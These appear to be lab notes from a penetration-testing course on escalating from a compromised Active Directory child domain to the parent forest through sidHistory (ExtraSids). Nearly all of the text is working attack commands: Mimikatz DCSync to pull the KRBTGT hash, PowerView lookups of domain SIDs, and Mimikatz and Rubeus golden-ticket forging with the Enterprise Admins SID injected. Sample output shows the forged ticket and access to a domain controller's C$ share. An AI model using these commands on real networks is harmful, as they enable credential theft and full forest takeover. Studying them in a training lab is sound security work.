
Therefore, if a user in a child domain that has their sidHistory set to the `Enterprise Admins group` (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.

To perform this attack after compromising a child domain, we need the following:
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.
## The First Way
### Mimikatz
```bash
lsadump::dcsync /user:user\krbtgt
```

### Powerview
```powershell
PS C:\htb> Get-DomainSID

# Obtaining Enterprise Admins Group SID using get-domaingroup
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

### Creating the Golden Ticket
```bash
# Using mimikatz and this syntax
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

### Checking to see if the ticket is stored using KList
```powershell
PS C:\htb> klist

Current LogonId is 0:0xf6462

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/28/2022 19:59:50 (local)
        End Time:   3/25/2032 19:59:50 (local)
        Renew Time: 3/25/2032 19:59:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
        
# Listing the entire C:\ of the Domain Controller
ls \\academy-ea-dc01.inlanefreight.local\c$

 Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
 Volume Serial Number is B8B3-0D72
```


## The Other Way
```powershell
PS C:\htb> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

klist
```

## Third way?
```powershell
PS C:\Mimikatz\x64> .\mimikatz.exe
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
# Specifying the Domain
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

#### Exercise information
```powershell
SID: S-1-5-21-2806153819-209893948-922872689
Enterprise Admins: S-1-5-21-3842939050-3880317879-2865463114-519
.\mimikatz.exe
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm

kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

```
